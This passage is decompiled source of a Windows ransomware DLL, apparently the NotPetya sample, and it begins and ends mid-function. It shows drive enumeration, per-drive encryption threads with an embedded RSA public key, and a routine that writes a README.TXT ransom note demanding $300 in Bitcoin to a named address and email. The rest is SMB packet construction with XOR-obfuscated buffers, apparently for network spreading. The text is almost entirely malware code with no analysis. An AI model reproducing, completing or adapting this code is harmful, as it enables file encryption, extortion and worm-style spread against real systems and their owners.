  HLOCAL v7; // [esp+Ch] [ebp-10h]
  BYTE *pbBinary; // [esp+10h] [ebp-Ch]
  DWORD pcchString; // [esp+14h] [ebp-8h]
  DWORD pdwDataLen; // [esp+18h] [ebp-4h]

  v1 = a1;
  v2 = *(a1 + 12);
  v7 = 0;
  v3 = *(a1 + 20);
  pdwDataLen = 0;
  if ( CryptExportKey(v3, v2, 1u, 0, 0, &pdwDataLen) )
  {
    v4 = LocalAlloc(0x40u, pdwDataLen);
    pbBinary = v4;
    if ( v4 )
    {
      if ( CryptExportKey(*(v1 + 20), *(v1 + 12), 1u, 0, v4, &pdwDataLen) )
      {
        pcchString = 0;
        if ( CryptBinaryToStringW(pbBinary, pdwDataLen, 1u, 0, &pcchString) )
        {
          v5 = LocalAlloc(0x40u, 2 * pcchString);
          if ( v5 )
          {
            if ( CryptBinaryToStringW(pbBinary, pdwDataLen, 1u, v5, &pcchString) )
              v7 = v5;
            else
              LocalFree(v5);
          }
        }
      }
      LocalFree(pbBinary);
    }
  }
  return v7;
}

//----- (681F1D32) --------------------------------------------------------
HLOCAL __stdcall GenerateReadMeMessage(LPCWSTR pszDir)
{
  HLOCAL result; // eax
  int v2; // eax
  HANDLE v3; // ebx
  WCHAR pszDest; // [esp+0h] [ebp-620h]
  LPCVOID lpBuffer; // [esp+618h] [ebp-8h]
  DWORD NumberOfBytesWritten; // [esp+61Ch] [ebp-4h]

  result = ImportPubKey(pszDir);
  if ( result )
  {
    result = CryptoExportKey(pszDir);
    lpBuffer = result;
    if ( result )
    {
      if ( PathCombineW(&pszDest, pszDir, L"README.TXT") )
      {
        v2 = ReturnTimeIfTimePassed();
        if ( v2 )
          Sleep(60000 * (v2 - 1));
        v3 = CreateFileW(&pszDest, 0x40000000u, 0, 0, 2u, 0, 0);
        if ( v3 != -1 )
        {
          NumberOfBytesWritten = 0;
          WriteFile(
            v3,
            L"Ooops, your important files are encrypted.\r\n"
             "\r\n"
             "If you see this text, then your files are no longer accessible, because\r\n"
             "they have been encrypted. Perhaps you are busy looking for a way to recover\r\n"
             "your files, but don't waste your time. Nobody can recover your files without\r\n"
             "our decryption service.\r\n"
             "\r\n"
             "We guarantee that you can recover all your files safely and easily.\r\n"
             "All you need to do is submit the payment and purchase the decryption key.\r\n"
             "\r\n"
             "Please follow the instructions:\r\n"
             "\r\n"
             "1.\tSend $300 worth of Bitcoin to following address:\r\n"
             "\r\n",
            0x432u,
            &NumberOfBytesWritten,
            0);
          WriteFile(v3, L"1Mz7153HMuxXTuR2R1t78mGSdzaAtNbBWX\r\n\r\n", 0x4Cu, &NumberOfBytesWritten, 0);
          WriteFile(
            v3,
            L"2.\tSend your Bitcoin wallet ID and personal installation key to e-mail ",
            0x8Eu,
            &NumberOfBytesWritten,
            0);
          WriteFile(v3, L"wowsmith123456@posteo.net.\r\n", 0x38u, &NumberOfBytesWritten, 0);
          WriteFile(v3, L"\tYour personal installation key:\r\n\r\n", 0x48u, &NumberOfBytesWritten, 0);
          WriteFile(v3, lpBuffer, 2 * wcslen(lpBuffer), &NumberOfBytesWritten, 0);
          CloseHandle(v3);
        }
      }
      result = LocalFree(*(pszDir + 6));
    }
  }
  return result;
}
// 681FFFB0: using guessed type wchar_t aYourPersonalIn[37];
// 681FFFFC: using guessed type wchar_t ReadMeEmailAddr[29];
// 68200038: using guessed type wchar_t a2_SendYourBitc[72];
// 682000C8: using guessed type wchar_t BitCoinAddress[39];
// 68200118: using guessed type wchar_t aOoopsYourImpor[538];

//----- (681F1E51) --------------------------------------------------------
DWORD __stdcall CryptoCleanUp(LPVOID lpThreadParameter)
{
  DWORD v1; // eax
  BOOL v2; // eax
  void *v3; // esi

  if ( CryptAcquireContextW(
         lpThreadParameter + 2,
         0,
         L"Microsoft Enhanced RSA and AES Cryptographic Provider",
         0x18u,
         0xF0000000) )
  {
    goto LABEL_7;
  }
  v1 = GetLastError();
  if ( v1 == -2146893799 )
  {
    v2 = CryptAcquireContextW(lpThreadParameter + 2, 0, 0, 0x18u, 0xF0000000);
  }
  else
  {
    if ( v1 != -2146893802 )
    {
LABEL_10:
      v3 = lpThreadParameter;
      goto LABEL_11;
    }
    v2 = CryptAcquireContextW(
           lpThreadParameter + 2,
           0,
           L"Microsoft Enhanced RSA and AES Cryptographic Provider",
           0x18u,
           8u);
  }
  if ( !v2 )
    goto LABEL_10;
LABEL_7:
  v3 = lpThreadParameter;
  if ( CryptoGenerateKey(lpThreadParameter) )
  {
    EnumerateFiles(lpThreadParameter, 15, lpThreadParameter);
    GenerateReadMeMessage(lpThreadParameter);
    CryptDestroyKey(*(lpThreadParameter + 5));
  }
  CryptReleaseContext(*(lpThreadParameter + 2), 0);
LABEL_11:
  LocalFree(v3);
  return 0;
}

//----- (681F1EEF) --------------------------------------------------------
_DWORD *CheckDriveAndPubKey()
{
  DWORD v0; // ebx
  signed int v1; // edi
  _DWORD *result; // eax
  WCHAR RootPathName[2]; // [esp+Ch] [ebp-8h]
  int v4; // [esp+10h] [ebp-4h]

  v0 = GetLogicalDrives();
  v1 = 31;
  do
  {
    result = (1 << v1);
    if ( (1 << v1) & v0 )
    {
      RootPathName[0] = v1 + 65;
      RootPathName[1] = 58;
      v4 = 92;
      result = GetDriveTypeW(RootPathName);
      if ( result == 3 )
      {
        result = LocalAlloc(0x40u, 0x20u);
        if ( result )
        {
          result[4] = L"MIIBCgKCAQEAxP/VqKc0yLe9JhVqFMQGwUITO6WpXWnKSNQAYT0O65Cr8PjIQInTeHkXEjfO2n2JmURWV/uHB0ZrlQ/wcYJBwL"
                       "hQ9EqJ3iDqmN19Oo7NtyEUmbYmopcq+YLIBZzQ2ZTK0A2DtX4GRKxEEFLCy7vP12EYOPXknVy/+mf0JFWixz29QiTf5oLu15w"
                       "VLONCuEibGaNNpgq+CXsPwfITDbDDmdrRIiUEUw6o3pt5pNOskfOJbMan2TZu6zfhzuts7KafP5UA8/0Hmf5K3/F9Mf9SE68E"
                       "ZjK+cIiFlKeWndP0XfRCYXI9AJYCeaOu7CXF6U0AVNnNjvLeOn42LHFUK4o6JwIDAQAB";
          result[7] = 0;
          *result = *RootPathName;
          result[1] = v4;
          result = CreateThread(0, 0, CryptoCleanUp, result, 0, 0);
        }
      }
    }
    --v1;
  }
  while ( v1 >= 0 );
  return result;
}

//----- (681F1F74) --------------------------------------------------------
bool __stdcall GetHeapAndMoveData(void *a1, size_t a2, void *Src, size_t Size, void *a5, size_t a6, int a7, int a8, void *a9, int a10, void *a11, int a12)
{
  size_t v12; // eax
  bool result; // al
  HANDLE v14; // eax
  char *v15; // edi
  char *v16; // edi
  _DWORD *v17; // edi

  v12 = Size + a6 + 487362;
  *a8 = v12;
  if ( a10 >= 0x2000 )
    a10 = 0x1FFF;
  if ( a12 > 0x80 )
    a12 = 127;
  if ( v12 < Size + a2 + a6 + 18460 )
    return 0;
  v14 = GetProcessHeap();
  v15 = HeapAlloc(v14, 8u, Size + a6 + 487362);
  *a7 = v15;
  result = 0;
  if ( memcpy(v15, Src, Size) )
  {
    v16 = &v15[Size];
    if ( memcpy(v16, a11, 2 * a12) )
    {
      v17 = v16 + 256;
      if ( memcpy(v17, a9, 2 * a10) )
      {
        v17[4550] = a2;
        if ( memcpy(v17 + 4551, a1, a2) )
        {
          if ( memcpy((*a7 + Size + 487362), a5, a6) )
            result = 1;
        }
      }
    }
  }
  return result;
}

//----- (681F2068) --------------------------------------------------------
int __usercall SockCloseConnection@<eax>(SOCKET *a1@<eax>)
{
  SOCKET *v1; // esi
  signed int v2; // edi
  int result; // eax

  v1 = a1;
  v2 = 21;
  do
  {
    result = *v1;
    if ( *v1 )
      result = closesocket(*v1);
    *v1 = -1;
    ++v1;
    --v2;
  }
  while ( v2 );
  return result;
}

//----- (681F2088) --------------------------------------------------------
BOOL __stdcall Dummy_StackSettup(__int64 a1)
{
  return (a1 + 0xFFFFFFFFFFFi64) <= 0xFFEFFFFFFFEi64;
}

//----- (681F20B2) --------------------------------------------------------
signed int CheckIfTimePassed()
{
  signed int result; // eax

  result = (GetTickCount() + dword_6820FB48 + 64);
  if ( !result )
    result = 64;
  return result;
}
// 6820FB48: using guessed type int dword_6820FB48;

//----- (681F20D0) --------------------------------------------------------
BOOL __usercall GetAndFreeHeap@<eax>(BOOL *a1@<esi>)
{
  BOOL result; // eax
  void *v2; // ST08_4
  HANDLE v3; // eax

  result = *a1;
  if ( *a1 )
  {
    v2 = *a1;
    v3 = GetProcessHeap();
    result = HeapFree(v3, 8u, v2);
    *a1 = 0;
  }
  return result;
}

//----- (681F20EA) --------------------------------------------------------
signed int __userpurge Unk_FindResourceAndIterate@<eax>(int a1@<esi>, __m64 mm0_0@<mm0>, __m64 mm1_0@<mm1>, _DWORD *a2, int a3, char a4)
{
  unsigned int v6; // edi
  HRSRC v7; // eax
  int v8; // eax
  _DWORD *v10; // ebx
  int v11; // ecx
  LPVOID v12; // eax
  unsigned int v13; // eax
  char v14; // [esp+8h] [ebp-4h]

  v6 = 0;
  v14 = byte_6820F8FC;
  if ( byte_6820F8FC )
  {
    v10 = a2;
  }
  else
  {
    v7 = FindResourceW(Src, 4, 0xA);
    if ( v7 )
      v8 = LoadAndLock(a1, mm0_0, mm1_0, a2, v7);
    else
      v8 = 0;
    if ( !v8 )
      return -1;
    v10 = a2;
    v11 = *a2;
    if ( *a2 != 1 )
    {
      do
      {
        *(*a1 + v6) ^= 0x86868686;
        v6 += 4;
      }
      while ( v6 < v11 - 1 );
    }
    *(*a1 + v11 - 1) ^= 0x86u;
    *(*a1 + 1425) = a3 + 3440;
    if ( a4 == 2 )
    {
      *(*a1 + 38) = -96;
      *(*a1 + 82) = -112;
      *(*a1 + 624) = 356;
      *(*a1 + 670) = 0;
      *(*a1 + 694) = 0;
    }
    if ( a4 == 3 )
    {
      *(*a1 + 38) = -112;
      *(*a1 + 82) = -128;
      *(*a1 + 624) = 88;
      *(*a1 + 694) = 0;
    }
    if ( a4 != 4 && a4 != 6 )
      return 0;
    *(*a1 + 38) = 120;
    *(*a1 + 82) = 104;
    *(*a1 + 624) = 104;
  }
  if ( v14 == 1 )
  {
    *v10 = 6136;
    v12 = CreateHeap(0x17F8u);
    *a1 = v12;
    if ( !v12 )
      return -1;
    if ( v6 < *v10 - 1 )
    {
      v13 = *v10 - 1;
      do
      {
        *(v6 + *a1) = dword_68200BB8[v6 / 4] ^ 0x64646464;
        v6 += 4;
      }
      while ( v6 < v13 );
    }
    *(*a1 + 2158) = a3 + 3978;
    if ( a4 == 2 || a4 == 3 )
    {
      *(*a1 + 2118) = 688;
      *(*a1 + 2130) = 656;
      *(*a1 + 2134) = -112;
      *(*a1 + 2142) = 0;
    }
    if ( a4 == 4 || a4 == 6 )
    {
      *(*a1 + 2118) = 640;
      *(*a1 + 2130) = 608;
      *(*a1 + 2134) = -112;
    }
  }
  return 0;
}
// 68200BB8: using guessed type int dword_68200BB8[];
// 6820F8FC: using guessed type char byte_6820F8FC;

//----- (681F22A2) --------------------------------------------------------
char __userpurge Unk_SockChecks@<al>(int a1@<eax>, unsigned __int16 a2)
{
  unsigned int v3; // ecx
  int v4; // edx
  int v5; // ecx
  int v6; // edx
  int v7; // edx
  unsigned int v8; // esi
  int v9; // edx
  int v10; // ecx
  int v11; // ecx
  int v12; // esi
  int v13; // edx
  int v14; // ecx
  int v15; // edx
  int v16; // edx
  int v17; // ecx
  unsigned int v18; // [esp+4h] [ebp-8h]
  char v19; // [esp+Bh] [ebp-1h]
  int v20; // [esp+14h] [ebp+8h]

  v19 = -1;
  if ( a2 < 0x2Du )
    return -1;
  v3 = *(a1 + 43);
  if ( v3 < 8 )
    return -1;
  if ( a2 < (v3 + 45) )
    return -1;
  v20 = 0;
  v18 = v3 - 8;
  if ( v3 != 8 )
  {
    v4 = 0;
    while ( 1 )
    {
      v5 = *(v4 + a1 + 45);
      v6 = *(v4 + a1 + 49);
      if ( 3473440 == v5 && !(v6 ^ 0x31002E) )
        goto LABEL_34;
      if ( 3473440 == v5 && !(v6 ^ 0x32002E) )
        return 3;
      if ( v5 == 6881366 && !(v6 ^ 0x740073) )
        return 4;
      if ( v5 == 7536759 && !(v6 ^ 0x370020) )
        return 5;
      v7 = v6 ^ 0x380030;
      if ( !(v5 ^ 0x300032) && !v7 )
      {
        v12 = 0;
        v19 = 6;
        v13 = 0;
        while ( 1 )
        {
          v14 = *(v13 + a1 + 45);
          v15 = *(v13 + a1 + 49) ^ 0x320052;
          if ( !(v14 ^ 0x200038) && !v15 )
            break;
          v13 = ++v12;
          if ( v12 >= v18 )
            return v19;
        }
        return 7;
      }
      v4 = ++v20;
      if ( v20 >= v18 )
      {
        v3 = *(a1 + 43);
        break;
      }
    }
  }
  v8 = v3 - 4;
  v9 = 0;
  if ( v3 != 4 )
  {
    v10 = 0;
    while ( 1 )
    {
      v11 = *(v10 + a1 + 45);
      if ( v11 == 825111840 )
        break;
      switch ( v11 )
      {
        case 841889056:
          return 3;
        case 1953720662:
          return 4;
        case 924873591:
          return 5;
      }
      if ( !(v11 ^ 0x38303032) )
      {
        v16 = 0;
        v19 = 6;
        v17 = 0;
        while ( *(v17 + a1 + 45) ^ 0x32522038 )
        {
          v17 = ++v16;
          if ( v16 >= v8 )
            return v19;
        }
        return 7;
      }
      v10 = ++v9;
      if ( v9 >= v8 )
        return v19;
    }
LABEL_34:
    v19 = 2;
  }
  return v19;
}

//----- (681F243F) --------------------------------------------------------
int __userpurge SockreceivData@<eax>(__int16 *a1@<esi>, SOCKET s, char a3, char a4)
{
  int v5; // [esp+4h] [ebp-4h]

  v5 = 4096;
  return -(SockGetData(&a4, a1, s, a3, &v5) != 0);
}

//----- (681F2466) --------------------------------------------------------
_WORD *__stdcall Unk_SetIpAddress(__int16 a1, char a2, __int16 a3, __int16 a4, __int16 a5, __int16 a6, __int16 a7, __int16 a8)
{
  _WORD *result; // eax
  _WORD *v9; // esi

  result = CreateHeap(0x24u);
  v9 = result;
  if ( result )
  {
    result[1] = htons(a1 - 4);
    *(v9 + 8) = a2;
    v9[7] = a3;
    v9[8] = a4;
    v9[14] = a5;
    v9[15] = a6;
    v9[16] = a7;
    v9[17] = a8;
    *(v9 + 1) = 1112364031;
    *(v9 + 13) = 24;
    result = v9;
  }
  return result;
}

//----- (681F24D0) --------------------------------------------------------
char *__fastcall sub_681F24D0(int a1, _WORD *a2, void *Src)
{
  char *result; // eax
  char *v4; // esi

  if ( !Src )
    return 0;
  *a2 = 1048;
  result = CreateHeap(0x418u);
  v4 = result;
  if ( result )
  {
    *(result + 1) = 30;
    *(result + 3) = 30;
    *(result + 5) = 30;
    *result = 276;
    *(result + 2) = 66512;
    *(result + 6) = 75;
    *(result + 7) = 976;
    *(result + 8) = 104;
    result[36] = 1;
    *(result + 41) = 1004;
    memcpy(result + 44, Src, 0x3ECu);
    result = v4;
  }
  return result;
}

//----- (681F2547) --------------------------------------------------------
_WORD *__userpurge sub_681F2547@<eax>(_WORD *a1@<eax>, __int16 a2, __int16 a3, __int16 a4, __int16 a5, _WORD *a6)
{
  _WORD *v6; // esi
  _BYTE *v7; // eax
  int v8; // ecx
  _WORD *v9; // edi
  _WORD *result; // eax
  __int16 v11; // ST1C_2
  unsigned __int16 v12; // bx
  __int16 v13; // ax
  char *v14; // eax
  int v15; // [esp+8h] [ebp-Ch]
  void *Src; // [esp+Ch] [ebp-8h]
  _BYTE *v17; // [esp+10h] [ebp-4h]
  _WORD *v18; // [esp+28h] [ebp+14h]

  v6 = a1;
  v7 = CreateHeap(0x3ECu);
  v9 = 0;
  v17 = v7;
  if ( !v7 )
    return 0;
  v7[30] = 1;
  v15 = 0;
  Src = sub_681F24D0(v8, &v15, v7);
  if ( !Src )
  {
    GetAndFreeHeap(&v17);
    return 0;
  }
  v11 = a6;
  v12 = v15;
  v13 = v15 + 36;
  *v6 = v15 + 36;
  a6 = Unk_SetIpAddress(v13, 160, 49159, a2, a3, a4, a5, v11);
  if ( a6 )
  {
    v14 = CreateHeap(*v6);
    v18 = v14;
    if ( v14 )
    {
      qmemcpy(v14, a6, 0x24u);
      memcpy(v14 + 36, Src, v12);
      v9 = v18;
    }
    GetAndFreeHeap(&Src);
    GetAndFreeHeap(&v17);
    GetAndFreeHeap(&a6);
    result = v9;
  }
  else
  {
    GetAndFreeHeap(&Src);
    GetAndFreeHeap(&v17);
    result = 0;
  }
  return result;
}

//----- (681F2620) --------------------------------------------------------
_BYTE *__stdcall Unk_ReturnByteArrayOfUnk_Exe(__int16 a1, __int16 a2, __int16 a3, __int16 a4, __int16 a5, _WORD *a6)
{
  _BYTE *result; // eax
  _DWORD *v7; // ebx
  signed int v8; // ecx
  char *v9; // eax
  int v10; // ebx
  _WORD *v11; // edi
  _WORD *v12; // esi
  LPVOID v13; // eax
  _BYTE *v14; // edi
  int v15; // [esp+4h] [ebp-8h]
  _BYTE *v16; // [esp+8h] [ebp-4h]

  result = CreateHeap(0xCu);
  v7 = result;
  v16 = result;
  if ( result )
  {
    qmemcpy(result, "bHbGcDiHpY`", 11);
    v8 = 11;
    do
    {
      *result++ ^= 0x2Bu;
      --v8;
    }
    while ( v8 );
    v9 = CreateHeap(0x11u);
    if ( v9 )
    {
      *(v9 + 1) = 1;
      *v9 = 1;
      *(v9 + 3) = 12;
      *(v9 + 5) = *v7;
      *(v9 + 9) = v7[1];
      *(v9 + 13) = v7[2];
      v10 = v9;
    }
    else
    {
      v10 = 0;
    }
    v15 = v10;
    if ( !v10 )
      goto LABEL_10;
    v11 = a6;
    *a6 = 53;
    v12 = Unk_SetIpAddress(53, 43, 49159, a1, a2, a3, a4, a5);
    a6 = v12;
    if ( !v12 )
    {
      GetAndFreeHeap(&v15);
LABEL_10:
      GetAndFreeHeap(&v16);
      return 0;
    }
    v13 = CreateHeap(*v11);
    if ( v13 )
    {
      qmemcpy(v13, v12, 0x24u);
      *(v13 + 9) = *v10;
      *(v13 + 10) = *(v10 + 4);
      *(v13 + 11) = *(v10 + 8);
      *(v13 + 12) = *(v10 + 12);
      *(v13 + 52) = *(v10 + 16);
      v14 = v13;
    }
    else
    {
      v14 = 0;
    }
    GetAndFreeHeap(&v15);
    GetAndFreeHeap(&v16);
    GetAndFreeHeap(&a6);
    result = v14;
  }
  return result;
}

//----- (681F270A) --------------------------------------------------------
_BYTE *__userpurge ProcessHeaps_1@<eax>(_WORD *a1@<eax>, __int16 a2, __int16 a3, __int16 a4, _WORD *a5)
{
  _WORD *v5; // ebx
  _BYTE *result; // eax
  _BYTE *v7; // edi
  _BYTE *v8; // eax
  signed int v9; // ecx
  char *v10; // eax
  void *v11; // esi
  __int16 v12; // ST1C_2
  _WORD *v13; // esi
  char *v14; // ebx
  void *v15; // [esp+8h] [ebp-Ch]
  void *Src; // [esp+Ch] [ebp-8h]
  _BYTE *v17; // [esp+10h] [ebp-4h]

  v5 = a1;
  result = CreateHeap(0x62u);
  v7 = result;
  v17 = result;
  if ( result )
  {
    memcpy(result, &unk_68208AD0, 0x62u);
    v8 = v7;
    v9 = 98;
    do
    {
      *v8++ ^= 0x72u;
      --v9;
    }
    while ( v9 );
    v10 = CreateHeap(0x65u);
    v11 = v10;
    if ( v10 )
    {
      *(v10 + 1) = 98;
      memcpy(v10 + 3, v7, 0x62u);
      Src = v11;
    }
    else
    {
      Src = 0;
    }
    v15 = Src;
    if ( !Src )
      goto LABEL_10;
    v12 = a5;
    *v5 = 137;
    v13 = Unk_SetIpAddress(137, 114, a2, a3, 0, a4, 0, v12);
    a5 = v13;
    if ( !v13 )
    {
      GetAndFreeHeap(&v15);
LABEL_10:
      GetAndFreeHeap(&v17);
      return 0;
    }
    v14 = CreateHeap(*v5);
    if ( v14 )
    {
      qmemcpy(v14, v13, 0x24u);
      memcpy(v14 + 36, Src, 0x65u);
    }
    GetAndFreeHeap(&v15);
    GetAndFreeHeap(&v17);
    GetAndFreeHeap(&a5);
    result = v14;
  }
  return result;
}

//----- (681F2802) --------------------------------------------------------
char *__userpurge CreateHeapAndMalloc@<eax>(_WORD *a1@<ecx>, unsigned __int16 a2@<di>, void *Src, char a4, __int16 a5, __int16 a6)
{
  char *result; // eax
  unsigned __int16 v7; // bx
  char *v8; // esi

  if ( a2 && !Src )
    return 0;
  v7 = 27;
  if ( a4 == 13 )
    v7 = 29;
  *a1 = v7 + a2;
  result = CreateHeap((v7 + a2));
  v8 = result;
  if ( result )
  {
    *(result + 5) = 4356;
    *(result + 7) = 10;
    *result = a4;
    result[1] = -1;
    *(result + 9) = a5;
    if ( a4 == 12 )
    {
      *(result + 21) = 2147483648;
      *(result + 25) = a2;
      *Src = a6;
    }
    if ( a4 == 13 )
    {
      *(result + 3) = 136;
      *(result + 15) = 1;
      *(result + 23) = 212;
      *(result + 27) = a2;
    }
    if ( a2 )
      memcpy(&result[v7], Src, a2);
    result = v8;
  }
  return result;
}

//----- (681F28B5) --------------------------------------------------------
_WORD *__userpurge sub_681F28B5@<eax>(char a1@<al>, __int16 a2, __int16 a3, __int16 a4, __int16 a5, BOOL a6, void *Src, _WORD *a8)
{
  char v8; // bl
  unsigned __int16 v10; // di
  void *v11; // eax
  _BYTE *v12; // eax
  signed int v13; // ecx
  unsigned __int16 v14; // bx
  _WORD *v15; // edi
  __int16 v16; // ax
  _WORD *v17; // esi
  _WORD *v18; // eax
  _WORD *v19; // edi
  int v20; // [esp+4h] [ebp-8h]
  void *v21; // [esp+8h] [ebp-4h]

  v8 = a1;
  if ( a1 != 12 && a1 != 13 )
    return 0;
  v10 = 0;
  v21 = 0;
  if ( a1 == 12 )
  {
    v10 = 22;
    v21 = CreateHeap(0x16u);
    if ( !v21 )
      return 0;
  }
  else if ( a1 == 13 )
  {
    v10 = 75;
    v11 = CreateHeap(0x4Bu);
    v21 = v11;
    if ( !v11 )
      return 0;
    memcpy(v11, &unk_68208B48, 0x4Bu);
    v12 = v21;
    v13 = 75;
    do
    {
      *v12++ ^= 0x73u;
      --v13;
    }
    while ( v13 );
  }
  v20 = 0;
  Src = CreateHeapAndMalloc(&v20, v10, v21, v8, a6, Src);
  if ( !Src )
  {
LABEL_14:
    GetAndFreeHeap(&v21);
    return 0;
  }
  v14 = v20;
  v15 = a8;
  v16 = v20 + 36;
  *a8 = v20 + 36;
  v17 = Unk_SetIpAddress(v16, 115, a2, a3, 0, a4, 0, a5);
  a6 = v17;
  if ( !v17 )
  {
    GetAndFreeHeap(&Src);
    goto LABEL_14;
  }
  v18 = CreateHeap(*v15);
  a8 = v18;
  if ( v18 )
  {
    qmemcpy(v18, v17, 0x24u);
    memcpy(v18 + 18, Src, v14);
    v19 = a8;
  }
  else
  {
    v19 = 0;
  }
  GetAndFreeHeap(&Src);
  GetAndFreeHeap(&v21);
  GetAndFreeHeap(&a6);
  return v19;
}

//----- (681F29CE) --------------------------------------------------------
_BYTE *__userpurge sub_681F29CE@<eax>(_WORD *a1@<eax>, __int16 a2, __int16 a3, __int16 a4, _WORD *a5)
{
  _WORD *v5; // ebx
  _BYTE *result; // eax
  _BYTE *v7; // edi
  _BYTE *v8; // eax
  signed int v9; // ecx
  _WORD *v10; // eax
  void *v11; // esi
  __int16 v12; // ST1C_2
  _WORD *v13; // esi
  char *v14; // ebx
  void *v15; // [esp+8h] [ebp-Ch]
  void *Src; // [esp+Ch] [ebp-8h]
  _BYTE *v17; // [esp+10h] [ebp-4h]

  v5 = a1;
  result = CreateHeap(0x2Du);
  v7 = result;
  v17 = result;
  if ( result )
  {
    memcpy(result, aUUUdugufuUdugu, 0x2Du);
    v8 = v7;
    v9 = 45;
    do
    {
      *v8++ ^= 0x75u;
      --v9;
    }
    while ( v9 );
    v10 = CreateHeap(0x38u);
    v11 = v10;
    if ( v10 )
    {
      *(v10 + 3) = 88;
      *(v10 + 5) = 8;
      *(v10 + 7) = 1;
      *(v10 + 9) = 45;
      *v10 = -252;
      memcpy(v10 + 11, v7, 0x2Du);
      Src = v11;
    }
    else
    {
      Src = 0;
    }
    v15 = Src;
    if ( !Src )
      goto LABEL_10;
    v12 = a5;
    *v5 = 92;
    v13 = Unk_SetIpAddress(92, 117, 49159, a2, 0, a3, a4, v12);
    a5 = v13;
    if ( !v13 )
    {
      GetAndFreeHeap(&v15);
LABEL_10:
      GetAndFreeHeap(&v17);
      return 0;
    }
    v14 = CreateHeap(*v5);
    if ( v14 )
    {
      qmemcpy(v14, v13, 0x24u);
      memcpy(v14 + 36, Src, 0x38u);
    }
    GetAndFreeHeap(&v15);
    GetAndFreeHeap(&v17);
    GetAndFreeHeap(&a5);
    result = v14;
  }
  return result;
}

//----- (681F2ADF) --------------------------------------------------------
char *__userpurge sub_681F2ADF@<eax>(_WORD *a1@<eax>, __int16 a2@<dx>, __int16 a3@<cx>, char a4, char a5)
{
  __int16 v5; // di
  __int16 v6; // si
  char *result; // eax
  signed int v8; // edi
  _BYTE *v9; // esi
  char *v10; // ecx
  char v11; // dl

  v5 = a3;
  v6 = a2;
  *a1 = 35;
  if ( a4 == 2 )
    *a1 = 42;
  if ( a4 == 3 )
    *a1 += 89;
  result = CreateHeap(*a1);
  if ( result )
  {
    *result = 16;
    result[27] = 2;
    if ( a4 == 1 )
    {
      *(result + 3) = 1;
      *(result + 7) = 1;
      *(result + 29) = 35;
      *(result + 5) = v6;
      *(result + 13) = 4096;
      *(result + 31) = v5;
    }
    if ( !a4 )
    {
      *(result + 13) = 1;
      *(result + 3) = v6;
      *(result + 29) = 54;
      *(result + 31) = v5;
    }
    if ( a4 == 2 )
    {
      *(result + 21) = 74;
      *(result + 25) = 74;
      *(result + 33) = 7;
      *(result + 35) = 20572;
      *(result + 37) = 20553;
      *(result + 5) = v6;
      *(result + 7) = v6;
      *(result + 29) = 35;
      *(result + 39) = 23621;
    }
    if ( a4 == 3 )
    {
      *(result + 7) = 4096;
      *(result + 11) = 8;
      *(result + 23) = 72;
      *(result + 31) = v5;
      *(result + 29) = 38;
      v8 = 89;
      *(result + 21) = v6;
      *(result + 25) = v6;
      *(result + 33) = 89;
      *(result + 3) = 72;
      *(result + 13) = 1000;
      v9 = &FormatsCharArray;
      v10 = result + 35;
      do
      {
        v11 = *v9++ ^ 0x25;
        *v10++ = v11;
        --v8;
      }
      while ( v8 );
      if ( !a5 )
      {
        *(result + 21) = 305420152;
        *(result + 22) = -1412623820;
        *(result + 23) = 587268335;
        *(result + 24) = -1417058491;
      }
    }
  }
  return result;
}

//----- (681F2C1E) --------------------------------------------------------
char *__fastcall sub_681F2C1E(__int16 cx0, __int16 dx0, int a1, int a2, int a3, int a4, int a5, int a6, int a7, int a8, void *Src)
{
  _WORD *v11; // esi
  char *result; // eax
  unsigned __int16 v13; // bx
  __int16 v14; // ax
  BOOL *v15; // esi
  char *v16; // eax
  int v17; // [esp+4h] [ebp-4h]
  char *v18; // [esp+28h] [ebp+20h]

  v17 = 0;
  v11 = Src;
  result = sub_681F2ADF(&v17, dx0, cx0, a7, a8);
  Src = result;
  if ( result )
  {
    v13 = v17;
    v14 = v17 + 36;
    *v11 = v17 + 36;
    a8 = Unk_SetIpAddress(v14, 37, a1, a2, a3, a4, a5, a6);
    if ( !a8 )
    {
      v15 = &Src;
LABEL_6:
      GetAndFreeHeap(v15);
      return 0;
    }
    v16 = CreateHeap(*v11);
    v18 = v16;
    if ( !v16 )
    {
      GetAndFreeHeap(&Src);
      v15 = &a8;
      goto LABEL_6;
    }
    qmemcpy(v16, a8, 0x24u);
    memcpy(v16 + 36, Src, v13);
    GetAndFreeHeap(&a8);
    GetAndFreeHeap(&Src);
    result = v18;
  }
  return result;
}

//----- (681F2CCF) --------------------------------------------------------
char *__thiscall sub_681F2CCF(void *this, int a2, int a3, void *Src, int a5)
{
  char *result; // eax
  char *v6; // ebx

  if ( a5 && !Src || !a3 )
    return 0;
  *this = a5 + 46;
  result = CreateHeap((a5 + 46));
  v6 = result;
  if ( result )
  {
    *(result + 19) = 12;
    *(result + 1) = 12;
    *(result + 21) = 66;
    *(result + 25) = 78;
    *(result + 5) = 1;
    *(result + 31) = a5 + 13;
    *(result + 29) = 14;
    *result = 15;
    *(result + 13) = a2;
    result[27] = 1;
    *(result + 34) = *a3;
    *(result + 38) = *(a3 + 4);
    *(result + 42) = *(a3 + 8);
    if ( a5 > 0u )
    {
      *(result + 3) = a5;
      *(result + 13) = a2;
      *(result + 23) = a5;
    }
    if ( a5 )
      memcpy(result + 46, Src, a5);
    result = v6;
  }
  return result;
}

//----- (681F2D82) --------------------------------------------------------
_WORD *__thiscall sub_681F2D82(void *this, char a2)
{
  signed __int16 v2; // di
  unsigned __int16 v3; // si
  _WORD *result; // eax
  unsigned __int8 v5; // dl
  unsigned __int16 i; // cx
  int v7; // ecx
  char v8; // bl
  char *v9; // [esp+Ch] [ebp-4h]

  v2 = 0;
  v3 = 0;
  v9 = 0;
  if ( !a2 )
  {
    v3 = 15;
    v9 = aVVVVVVVvv;
    v2 = 12;
  }
  if ( a2 == 1 )
  {
    v3 = 17;
    v9 = aVVVVVVVVvv;
    v2 = 14;
  }
  *this = v3 + 51;
  result = CreateHeap((v3 + 51));
  if ( result )
  {
    *(result + 3) = 98;
    v5 = 0;
    *result = -232;
    result[3] = v2;
    *(result + 2) = 22;
    *(result + 4) = 131487;
    *(result + 8) = 3;
    *(result + 9) = 1;
    *(result + 10) = 64;
    *(result + 11) = 2;
    *(result + 48) = 3;
    *(result + 49) = v3;
    for ( i = 0; i < v3; i = v5 )
    {
      v7 = v5;
      v8 = v9[v5++] ^ 0xA2;
      *(result + v7 + 51) = v8;
    }
  }
  return result;
}

//----- (681F2E30) --------------------------------------------------------
char *__userpurge sub_681F2E30@<eax>(_WORD *a1@<ebx>, unsigned __int16 a2@<di>, char a3, __int16 a4, void *Src)
{
  char *result; // eax
  char *v6; // esi

  if ( a2 && !Src )
